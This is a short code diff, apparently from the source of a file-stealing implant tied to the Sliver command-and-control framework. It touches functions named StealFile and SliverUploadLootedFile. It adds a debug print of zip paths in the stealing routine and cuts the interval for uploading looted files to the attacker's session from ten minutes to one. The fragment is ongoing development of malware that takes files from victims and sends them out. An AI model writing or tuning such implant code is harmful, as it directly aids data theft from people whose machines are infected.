@@ -1705,6 +1705,7 @@ BOOL StealFile
 					break;
 				}
 
+				PrintFormatW(L"Zip path: %s\n", lpPath);
 				ItemList = ExtractFromZip(lpPath, NULL, FALSE, &dwNumberOfItems);
 				if (ItemList == NULL) {
 					continue;
@@ -1940,7 +1941,7 @@ VOID SliverUploadLootedFile
 
 	while (TRUE) {
 		ListFileEx(lpWarehouse, LIST_JUST_FILE, UploadLootedFileCallback, pSession);
-		Sleep(600000);
+		Sleep(60000);
 	}
 CLEANUP:
 	return;
